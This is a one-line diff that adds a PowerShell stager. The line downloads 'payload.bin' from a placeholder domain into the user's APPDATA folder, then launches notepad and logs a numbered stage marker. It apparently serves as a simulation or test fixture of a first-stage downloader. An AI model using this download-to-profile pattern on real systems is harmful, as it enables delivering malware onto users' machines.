@@ -1,0 +1,1 @@
+$RemoteUrl = 'https://contoso.com/payload.bin'; $Stage2Path = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $Stage2Path); Start-Process -FilePath 'notepad.exe'; Write-Verbose "stage marker 21 reached"
